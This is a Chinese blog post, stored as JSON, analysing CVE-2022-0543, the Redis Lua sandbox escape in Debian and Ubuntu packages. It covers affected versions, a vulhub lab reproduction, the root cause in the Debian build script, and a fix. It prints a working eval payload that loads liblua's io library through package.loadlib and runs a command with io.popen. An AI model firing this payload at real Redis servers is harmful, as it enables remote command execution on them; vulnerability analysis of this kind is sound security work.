{"title":"Redis-Escape-Rce","uid":"4851b902ea2223fecb14c4248effd820","slug":"redis-sand-box-rce","date":"2022-03-31T17:08:49.000Z","updated":"2022-03-31T17:19:10.454Z","comments":true,"path":"api/articles/redis-sand-box-rce.json","keywords":null,"cover":"https://w.wallhaven.cc/full/g7/wallhaven-g7mqkl.jpg","content":"<h2 id=\"CVE-2022-0543-Redis-Lua-Sandbox-Escape-and-Remote-Code-Execution-（redis-沙箱逃逸和远程代码执行——\"><a href=\"#CVE-2022-0543-Redis-Lua-Sandbox-Escape-and-Remote-Code-Execution-（redis-沙箱逃逸和远程代码执行——\" class=\"headerlink\" title=\"[CVE-2022-0543] Redis-Lua-Sandbox-Escape-and-Remote-Code-Execution （redis 沙箱逃逸和远程代码执行——\"></a>[CVE-2022-0543] Redis-Lua-Sandbox-Escape-and-Remote-Code-Execution （redis 沙箱逃逸和远程代码执行——</h2><h3 id=\"0x00-漏洞影响版本\"><a href=\"#0x00-漏洞影响版本\" class=\"headerlink\" title=\"0x00:漏洞影响版本\"></a>0x00:漏洞影响版本</h3><h4 id=\"Ubuntu的Redis-Server\"><a href=\"#Ubuntu的Redis-Server\" class=\"headerlink\" title=\"Ubuntu的Redis-Server\"></a>Ubuntu的Redis-Server</h4><table>\n<thead>\n<tr>\n<th align=\"center\">发行版本</th>\n<th align=\"center\">状态</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">bionic</td>\n<td align=\"center\">该版本不存在漏洞</td>\n</tr>\n<tr>\n<td align=\"center\">focal</td>\n<td align=\"center\">目前最新版本:5:5.0.7-2ubuntu0.1(已修复)</td>\n</tr>\n<tr>\n<td align=\"center\">impish</td>\n<td align=\"center\">目前最新版本:5:6.0.15-1ubuntu0.1(已修复)</td>\n</tr>\n<tr>\n<td align=\"center\">trusty</td>\n<td align=\"center\">该版本不存在漏洞</td>\n</tr>\n<tr>\n<td align=\"center\">upstream</td>\n<td align=\"center\">目前最新版本 :6.0.16-1+deb11u2(已修复)</td>\n</tr>\n<tr>\n<td align=\"center\">xenial</td>\n<td align=\"center\">超出标准支持</td>\n</tr>\n</tbody></table>\n<h4 id=\"Debain的Redis-Server\"><a href=\"#Debain的Redis-Server\" class=\"headerlink\" title=\"Debain的Redis-Server\"></a>Debain的Redis-Server</h4><table>\n<thead>\n<tr>\n<th align=\"center\">发行版本</th>\n<th align=\"center\">状态</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">stretch&#x2F;stretch (security)</td>\n<td align=\"center\">目前最新版本: 3:3.2.6-3+deb9u3 (已修复)</td>\n</tr>\n<tr>\n<td align=\"center\">buster</td>\n<td align=\"center\">版本: 5:5.0.3-4+deb10u3 (存在漏洞)</td>\n</tr>\n<tr>\n<td align=\"center\">buster (security)</td>\n<td align=\"center\">目前最新版本: 5:5.0.14-1+deb10u2 (已修复)</td>\n</tr>\n<tr>\n<td align=\"center\">bullseye</td>\n<td align=\"center\">版本: 5:6.0.15-1 (存在漏洞)</td>\n</tr>\n<tr>\n<td align=\"center\">bullseye (security)</td>\n<td align=\"center\">目前最新版本:5:6.0.16-1+deb11u2 (已修复)</td>\n</tr>\n<tr>\n<td align=\"center\">bookworm, sid</td>\n<td align=\"center\">目前最新版本:5:6.0.16-2 (已修复)</td>\n</tr>\n</tbody></table>\n<h3 id=\"0x01-漏洞复现\"><a href=\"#0x01-漏洞复现\" class=\"headerlink\" title=\"0x01:漏洞复现\"></a>0x01:漏洞复现</h3><p>复现就用vulhub的虚拟环境,，先把服务开起来:</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">git</span> clone https://github.com/vulhub/vulhub.git\n<span class=\"token builtin class-name\">cd</span> vulhub/redis/CVE-2022-0543\n<span class=\"token function\">docker-compose</span> up -d   //开启服务\n<span class=\"token function\">docker</span> <span class=\"token function\">ps</span>  //检测一下容器是否部署好<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><img src=\"https://shenlin-1255940024.cos.ap-beijing.myqcloud.com/blog/Untitled.png\" alt=\"Untitled\"></p>\n<p>直接redis连上，p神这个镜像含有非授权访问的漏洞，连上发送payload。</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">redis-cli -h <span class=\"token operator\">&lt;</span>你的部署镜像的ip<span class=\"token operator\">></span>\n\n<span class=\"token builtin class-name\">eval</span> <span class=\"token string\">'local io_l = package.loadlib(\"/usr/lib/x86_64-linux-gnu/liblua5.1.so.0\", \"luaopen_io\"); local io = io_l(); local f = io.popen(\"id\", \"r\"); local res = f:read(\"*a\"); f:close(); return res'</span> <span class=\"token number\">0</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p><img src=\"https://shenlin-1255940024.cos.ap-beijing.myqcloud.com/blog/Untitled%201.png\" alt=\"Untitled\"></p>\n<p>可以看到命令执行。</p>\n<h3 id=\"0x02：漏洞原理\"><a href=\"#0x02：漏洞原理\" class=\"headerlink\" title=\"0x02：漏洞原理\"></a>0x02：漏洞原理</h3><p>Debian以及Ubuntu发行版的源在打包Redis时，在Lua沙箱中遗留了一个对象package，攻击者可以利用这个对象提供的方法加载动态链接库liblua里的函数，进而逃逸沙箱执行任意命令。</p>\n<p>我们看一下源码：<code>[http://download.redis.io/releases/redis-6.0.15.tar.gz](http://download.redis.io/releases/redis-6.0.15.tar.gz)</code></p>\n<p>这里注释掉了</p>\n<pre class=\"line-numbers language-lua\" data-language=\"lua\"><code class=\"language-lua\"><span class=\"token function\">luaLoadLib</span><span class=\"token punctuation\">(</span>lua<span class=\"token punctuation\">,</span> LUA_LOADLIBNAME<span class=\"token punctuation\">,</span> luaopen_package<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"https://shenlin-1255940024.cos.ap-beijing.myqcloud.com/blog/Untitled%202.png\" alt=\"Untitled\"></p>\n<p>但是在Debian的系统里面将这句话写入内容中了，Debian make 的源码如下：</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">debian/lua_libs_debian.c:\n    <span class=\"token builtin class-name\">echo</span> <span class=\"token string\">\"// Automatically generated; do not edit.\"</span> <span class=\"token operator\">></span><span class=\"token variable\">$@</span>\n    <span class=\"token builtin class-name\">echo</span> <span class=\"token string\">\"luaLoadLib(lua, LUA_LOADLIBNAME, luaopen_package);\"</span> <span class=\"token operator\">>></span><span class=\"token variable\">$@</span>\n    <span class=\"token builtin class-name\">set</span> -e<span class=\"token punctuation\">;</span> <span class=\"token keyword\">for</span> <span class=\"token for-or-select variable\">X</span> <span class=\"token keyword\">in</span> <span class=\"token variable\"><span class=\"token variable\">$(</span>LUA_LIBS_DEBIAN_NAMES<span class=\"token variable\">)</span></span><span class=\"token punctuation\">;</span> <span class=\"token keyword\">do</span> <span class=\"token punctuation\">\\</span>\n        <span class=\"token builtin class-name\">echo</span> <span class=\"token string\">\"if (luaL_dostring(lua, <span class=\"token entity\" title=\"\\&quot;\">\\\"</span><span class=\"token variable\">$$</span>X = require('<span class=\"token variable\">$$</span>X');<span class=\"token entity\" title=\"\\&quot;\">\\\"</span>))\"</span> <span class=\"token operator\">>></span><span class=\"token variable\">$@</span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">\\</span>\n        <span class=\"token builtin class-name\">echo</span> <span class=\"token string\">\"    serverLog(LL_NOTICE, <span class=\"token entity\" title=\"\\&quot;\">\\\"</span>Error loading <span class=\"token variable\">$$</span>X library<span class=\"token entity\" title=\"\\&quot;\">\\\"</span>);\"</span> <span class=\"token operator\">>></span><span class=\"token variable\">$@</span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">\\</span>\n    <span class=\"token keyword\">done</span>\n    <span class=\"token builtin class-name\">echo</span> <span class=\"token string\">'luaL_dostring(lua, \"module = nil; require = nil;\");'</span> <span class=\"token operator\">>></span><span class=\"token variable\">$@</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>导致了漏洞的产生。</p>\n<p>我们借助Lua沙箱中遗留的变量<code>package</code><br>的<code>loadlib</code><br>函数来加载动态链接库<code>/usr/lib/x86_64-linux-gnu/liblua5.1.so.0</code><br>里的导出函数<code>luaopen_io</code><br>。在Lua中执行这个导出函数，即可获得<code>io</code><br>库，再使用其执行命令：</p>\n<p>值得注意的是，不同环境下的liblua库路径不同，你需要指定一个正确的路径。在Vulhub环境（Ubuntu fiocal）中，这个路径是<code>/usr/lib/x86_64-linux-gnu/liblua5.1.so.0</code><br>。</p>\n<p>这里的函数也可以使用luaopen_os函数，但是前提是要知道liblua的路径</p>\n<pre class=\"line-numbers language-lua\" data-language=\"lua\"><code class=\"language-lua\"><span class=\"token keyword\">local</span> io_l <span class=\"token operator\">=</span> package<span class=\"token punctuation\">.</span><span class=\"token function\">loadlib</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/usr/lib/x86_64-linux-gnu/liblua5.1.so.0\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"luaopen_io\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">local</span> io <span class=\"token operator\">=</span> <span class=\"token function\">io_l</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">local</span> f <span class=\"token operator\">=</span> io<span class=\"token punctuation\">.</span><span class=\"token function\">popen</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"id\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"r\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">local</span> res <span class=\"token operator\">=</span> f<span class=\"token punctuation\">:</span><span class=\"token function\">read</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"*a\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\nf<span class=\"token punctuation\">:</span><span class=\"token function\">close</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">return</span> res<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"0x03：lua逃逸问题\"><a href=\"#0x03：lua逃逸问题\" class=\"headerlink\" title=\"0x03：lua逃逸问题\"></a>0x03：lua逃逸问题</h3><p>早在之前redis 就存在lua 的逃逸问题：</p>\n<p>比如loadstring 函数未进行过滤，导致代码执行。</p>\n<p><a href=\"https://gist.github.com/corsix/6575486\">https://gist.github.com/corsix/6575486</a></p>\n<h3 id=\"0x04：修复建议\"><a href=\"#0x04：修复建议\" class=\"headerlink\" title=\"0x04：修复建议\"></a>0x04：修复建议</h3><p>Lua 初始化的末尾添加<strong>package&#x3D;nil 。</strong></p>\n<p><code>luaL_dostring(lua, &quot;module = nil; require = nil;package=nil;&quot;)</code></p>\n<p>ids规则针对package.loadlib进行拦截。</p>\n<h3 id=\"0x05：资料参考\"><a href=\"#0x05：资料参考\" class=\"headerlink\" title=\"0x05：资料参考\"></a>0x05：资料参考</h3><p><a href=\"https://www.freebuf.com/news/325729.html\">https://www.freebuf.com/news/325729.html</a></p>\n<p><a href=\"https://github.com/vulhub/vulhub/blob/master/redis/CVE-2022-0543/README.zh-cn.md\">https://github.com/vulhub/vulhub/blob/master/redis/CVE-2022-0543/README.zh-cn.md</a></p>\n<p><a href=\"https://www.adminxe.com/3620.html\">https://www.adminxe.com/3620.html</a></p>\n<p><a href=\"https://github.com/redis/redis-hashes\">https://github.com/redis/redis-hashes</a></p>\n<p><a href=\"https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=14202&amp;highlight=xp\">https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=14202&amp;highlight=xp</a></p>\n","feature":true,"text":"[CVE-2022-0543] Redis-Lua-Sandbox-Escape-and-Remote-Code-Execution （redis 沙箱逃逸和远程代码执行——0x00:漏洞影响版本Ubuntu的Redis-Server 发行版本 状态 bionic 该版本不存在漏...","link":"","photos":[],"count_time":{"symbolsCount":"2.8k","symbolsTime":"3 mins."},"categories":[],"tags":[{"name":"漏洞分析","slug":"漏洞分析","count":1,"path":"api/tags/漏洞分析.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#CVE-2022-0543-Redis-Lua-Sandbox-Escape-and-Remote-Code-Execution-%EF%BC%88redis-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%92%8C%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E2%80%94%E2%80%94\"><span class=\"toc-text\">[CVE-2022-0543] Redis-Lua-Sandbox-Escape-and-Remote-Code-Execution （redis 沙箱逃逸和远程代码执行——</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x00-%E6%BC%8F%E6%B4%9E%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC\"><span class=\"toc-text\">0x00:漏洞影响版本</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#Ubuntu%E7%9A%84Redis-Server\"><span class=\"toc-text\">Ubuntu的Redis-Server</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#Debain%E7%9A%84Redis-Server\"><span class=\"toc-text\">Debain的Redis-Server</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x01-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0\"><span class=\"toc-text\">0x01:漏洞复现</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x02%EF%BC%9A%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86\"><span class=\"toc-text\">0x02：漏洞原理</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x03%EF%BC%9Alua%E9%80%83%E9%80%B8%E9%97%AE%E9%A2%98\"><span class=\"toc-text\">0x03：lua逃逸问题</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x04%EF%BC%9A%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE\"><span class=\"toc-text\">0x04：修复建议</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x05%EF%BC%9A%E8%B5%84%E6%96%99%E5%8F%82%E8%80%83\"><span class=\"toc-text\">0x05：资料参考</span></a></li></ol></li></ol>","author":{"name":"神林","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"一名面向github挖洞的安全研究员","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{},"next_post":{"title":"Spring-Core-Rce 0day 通告","uid":"5be2d45f1267b8ebe5bb9dc94fd9c754","slug":"Spring-Core-Rce","date":"2022-03-30T13:51:40.000Z","updated":"2022-03-30T16:36:30.758Z","comments":true,"path":"api/articles/Spring-Core-Rce.json","keywords":null,"cover":"https://w.wallhaven.cc/full/o3/wallhaven-o3elvp.jpg","text":"漏洞时间线：2022-03-29：晚上业内师傅们开始公布漏洞利用成功，并未公布漏洞细节，github出现钓鱼（0day,红线标注，微步沙箱并未检测出威胁，经分析是钓鱼exe。），截至目前，仓库已经删除。 2022-03-30：漏洞影响开始发酵，开始出现部分exp代码。 漏洞影响：...","link":"","photos":[],"count_time":{"symbolsCount":681,"symbolsTime":"1 mins."},"categories":[],"tags":[{"name":"威胁通告","slug":"威胁通告","count":1,"path":"api/tags/威胁通告.json"}],"author":{"name":"神林","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"一名面向github挖洞的安全研究员","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"feature":true}}